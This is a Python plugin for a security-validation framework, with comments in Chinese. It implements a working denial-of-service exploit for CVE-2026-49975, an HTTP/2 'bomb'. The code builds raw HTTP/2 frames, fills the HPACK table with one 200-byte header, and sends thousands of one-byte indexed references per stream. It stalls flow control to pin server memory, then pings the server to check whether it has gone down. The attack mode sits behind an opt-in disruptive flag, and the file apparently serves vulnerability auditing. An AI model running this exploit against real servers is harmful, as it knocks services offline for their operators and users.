#!/usr/bin/env python3
"""CVE-2026-49975 – HTTP/2 Bomb: HPACK indexed-reference amplification + flow-control stall DoS.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-49975%20HTTP2%20Bomb
  Files: ['exploit/exploit.py']
  Technique (per poc-lab README and Calif Global Inc. research, 2026-06-02):
    1. Establish HTTP/2 connection; send SETTINGS + initial WINDOW_UPDATE(0).
    2. Insert one header into dynamic HPACK table.
    3. Send HEADERS frame with 4096+ indexed references to that entry.
       Each 1-byte index → server allocates full header copy (~100-500 bytes → amplification).
    4. Hold connection with minimal WINDOW_UPDATE to stall flow control, preventing memory release.
    5. Repeat across streams → server memory exhausted → DoS.
  Affected: nginx <1.29.8, Apache httpd (mod_http2 <2.0.41), Envoy, Microsoft IIS, Cloudflare Pingora.

Reference: https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb
  CVE: CVE-2026-49975 (Apache httpd specific; other implementations tracked separately)
"""
from __future__ import annotations

import socket
import ssl
import struct
import time

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 65,
    "cve": "CVE-2026-49975",
    "year": 2026,
    "domain": "network",
    "vendor_product": "HTTP/2 implementations (nginx <1.29.8, Apache httpd mod_http2 <2.0.41, Envoy, IIS, Pingora)",
    "component": "HTTP/2 HPACK dynamic table – indexed-reference header amplification + flow-control window stall",
    "type": "远程拒绝服务 – 内存放大",
    "summary": (
        "CVE-2026-49975 HTTP/2 Bomb: 攻击者向启用 HTTP/2 的服务器发送大量 HPACK 索引引用，"
        "服务器为每次引用分配完整头部副本（1字节输入 → 数百字节内存分配）。"
        "同时通过 WINDOW_UPDATE=0 停滞流控窗口，使已分配内存无法释放，最终导致内存耗尽 DoS。"
        "影响 nginx、Apache httpd、Envoy、IIS、Cloudflare Pingora 的默认 HTTP/2 配置。"
    ),
    "source_url": "https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb",
    "requires_manual_review": False,
    "affected": [
        {"vendor": "nginx", "product": "nginx", "versions": [{"version": "0", "status": "affected", "lessThan": "1.29.8"}]},
        {"vendor": "Apache", "product": "httpd mod_http2", "versions": [{"version": "0", "status": "affected", "lessThan": "2.0.41"}]},
    ],
}

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def _build_settings(max_header_list_size: int = 0) -> bytes:
    """Build HTTP/2 SETTINGS frame. Payload: 0 settings = empty (or optionally set limits)."""
    # Frame: length(3) + type(1) + flags(1) + stream_id(4) + payload
    # Type 0x4 = SETTINGS, flags 0x0 (no ACK)
    payload = b""
    return struct.pack(">I", len(payload))[1:] + b"\x04\x00" + struct.pack(">I", 0) + payload


def _build_settings_ack() -> bytes:
    return b"\x00\x00\x00\x04\x01\x00\x00\x00\x00"


def _build_window_update(stream_id: int, increment: int) -> bytes:
    """Build HTTP/2 WINDOW_UPDATE frame."""
    payload = struct.pack(">I", increment & 0x7FFFFFFF)
    return struct.pack(">I", len(payload))[1:] + b"\x08\x00" + struct.pack(">I", stream_id) + payload


def _build_hpack_bomb_headers(n_references: int = 4096) -> bytes:
    """Build HPACK header block: insert one literal header, then n_references indexed refs.
    This reuses entry at index 62 (first dynamic table entry) n_references times.
    Each server-side: 1 byte on wire → full header value allocated in memory.
    """
    # Literal header with incremental indexing: name=x-bomb, value=A*200
    name = b"x-bomb"
    value = b"A" * 200
    # HPACK Literal Header Field with Incremental Indexing – New Name (0x40)
    literal = (
        b"\x40"                              # Literal with increment, new name
        + bytes([len(name)]) + name         # name length + name
        + bytes([len(value)]) + value       # value length + value
    )
    # Indexed header field reference, index 62 (0x3E) → first dynamic table entry
    indexed_ref = b"\xbe"  # 0b10111110 = indexed field representation, index 62
    return literal + (indexed_ref * n_references)


def _build_headers_frame(stream_id: int, header_block: bytes, end_headers: bool = True) -> bytes:
    """Build HTTP/2 HEADERS frame."""
    # Also include :method GET, :path /, :scheme https, :authority - minimal required
    # Use pre-built HPACK static table references for standard headers:
    # Index 2 = :method GET, 4 = :path /, 7 = :scheme https, 1 = :authority
    static_headers = (
        b"\x82"   # :method GET (index 2, indexed)
        b"\x84"   # :path /    (index 4)
        b"\x86"   # :scheme https (index 6... actually need to check)
        b"\x41"   # Literal :authority (index 1 base) without indexing
        b"\x0flocalhost"  # 15 bytes "localhost"
    )
    payload = static_headers + header_block
    flags = 0x04 if end_headers else 0x00   # END_HEADERS
    frame_type = b"\x01"                     # HEADERS
    return struct.pack(">I", len(payload))[1:] + frame_type + bytes([flags]) + struct.pack(">I", stream_id) + payload


def _run_http2_bomb(target_ip: str, port: int, tls: bool, n_streams: int,
                    n_references: int, hold_seconds: float) -> dict:
    result: dict = {}
    header_block = _build_hpack_bomb_headers(n_references)
    total_frames = n_streams

    try:
        raw = socket.create_connection((target_ip, port), timeout=10)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            raw = ctx.wrap_socket(raw, server_hostname=target_ip)

        raw.settimeout(10.0)

        # HTTP/2 handshake
        raw.sendall(CLIENT_PREFACE)
        raw.sendall(_build_settings())
        try:
            raw.recv(512)   # Server SETTINGS
        except Exception:
            pass
        raw.sendall(_build_settings_ack())

        # Send connection-level WINDOW_UPDATE = 0 (stall flow control)
        raw.sendall(_build_window_update(0, 0))

        # Send HPACK bomb streams
        for i in range(n_streams):
            stream_id = 2 * i + 1
            frame = _build_headers_frame(stream_id, header_block)
            try:
                raw.sendall(frame)
            except BrokenPipeError:
                result["server_closed_early"] = True
                result["streams_sent"] = i
                break
        else:
            result["streams_sent"] = n_streams

        result["references_per_stream"] = n_references
        result["estimated_amplification"] = f"~{n_references * 200 / 1024:.0f} KB per stream"

        # Hold connection to prevent memory release
        time.sleep(min(hold_seconds, 3.0))

        # Check if server is still responding
        try:
            raw.settimeout(2.0)
            # Send PING frame (type 0x6)
            raw.sendall(b"\x00\x00\x08\x06\x00\x00\x00\x00\x00" + b"\x00" * 8)
            pong = raw.recv(256)
            result["server_responding_after_bomb"] = len(pong) > 0
        except Exception:
            result["server_responding_after_bomb"] = False
            result["server_may_be_overloaded"] = True

        raw.close()

    except ConnectionRefusedError:
        result["no_service"] = f"No HTTP/2 service at {target_ip}:{port}"
    except ssl.SSLError as exc:
        result["ssl_error"] = str(exc)
        result["detail"] = "TLS error; try with tls=false or different port."
    except Exception as exc:
        result["error"] = str(exc)

    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 443))
    tls = bool(params.get("tls", port == 443))
    n_streams = int(params.get("streams", 2))
    n_references = int(params.get("references", 1024))
    hold_seconds = float(params.get("hold_seconds", 2.0))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool(params.get("allow_disruptive"))

    evidence: dict = {
        "cve": "CVE-2026-49975",
        "target": f"{target_ip}:{port}",
        "technique": (
            "HTTP/2 HPACK indexed-reference amplification: "
            "insert 1 dynamic header entry → send n_references × indexed-ref per stream. "
            "Server allocates full header copy per reference (1B wire → ~200B heap). "
            "WINDOW_UPDATE=0 stalls flow control, pinning allocated memory → OOM DoS."
        ),
        "reference": "https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb",
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-49975%20HTTP2%20Bomb",
        "exploit_files": ["exploit/exploit.py"],
        "affected_versions": "nginx<1.29.8, Apache httpd mod_http2<2.0.41, Envoy, IIS, Cloudflare Pingora",
        "fixed_versions": "nginx 1.29.8+ (max_headers limit); Apache mod_http2 2.0.41+",
    }

    if not allow_disruptive:
        # Non-disruptive: check for HTTP/2 support via ALPN
        try:
            raw = socket.create_connection((target_ip, port), timeout=6)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            wrapped = ctx.wrap_socket(raw, server_hostname=target_ip)
            alpn = wrapped.selected_alpn_protocol()
            evidence["h2_supported"] = alpn == "h2"
            evidence["alpn_negotiated"] = alpn
            wrapped.close()
        except ssl.SSLError:
            evidence["h2_check"] = "TLS error (try non-TLS port or h2c)"
        except ConnectionRefusedError:
            evidence["no_service"] = True
        except Exception as exc:
            evidence["error"] = str(exc)

        evidence["detail"] = (
            "Set allow_disruptive=true to send the HPACK bomb (may cause server memory pressure/DoS). "
            f"Configuration: streams={n_streams}, references={n_references}."
        )
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    # Disruptive: send the actual HPACK bomb
    bomb_result = _run_http2_bomb(target_ip, port, tls, n_streams, n_references, hold_seconds)
    evidence.update(bomb_result)

    if bomb_result.get("no_service") or bomb_result.get("ssl_error"):
        evidence["detail"] = "HTTP/2 service not reachable."
        return {"vulnerable": None, "evidence": evidence}

    if bomb_result.get("server_may_be_overloaded") or not bomb_result.get("server_responding_after_bomb"):
        evidence["detail"] = (
            "Server unresponsive after HPACK bomb – likely memory pressure or DoS triggered (CVE-2026-49975)."
        )
        vulnerable = True
    elif bomb_result.get("server_responding_after_bomb") is False:
        evidence["detail"] = "Server did not respond to PING after bomb – DoS effective."
        vulnerable = True
    else:
        evidence["detail"] = "Server still responding after bomb – may have patched header limits or HTTP/2 disabled."
        vulnerable = False

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class HTTP2HpackBombDoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-NET-065"
    meta_poc_name = 'CVE-2026-49975 DoS Active Validation'
    meta_cve_id = "CVE-2026-49975"
    meta_severity = "High"
    meta_protocol = "http2"
    meta_target_os = ["linux", "bsd", "windows"]
    meta_required_params = []
    meta_optional_params = ["port", "tls", "streams", "references", "hold_seconds", "allow_disruptive"]
    meta_profiles = ["network", "http2", "dos"]
    meta_source_url = "https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb"
    meta_references       = ['https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb']
    meta_attack_surface = "HTTP/2 服务 – 无需认证 – HPACK 索引引用放大 + 流控停滞 → 内存耗尽 DoS"
    is_disruptive = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "65_HTTP2_HPACK_Bomb_DoS_Audit") if "VULN" in dir() else "65_HTTP2_HPACK_Bomb_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = HTTP2HpackBombDoSAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
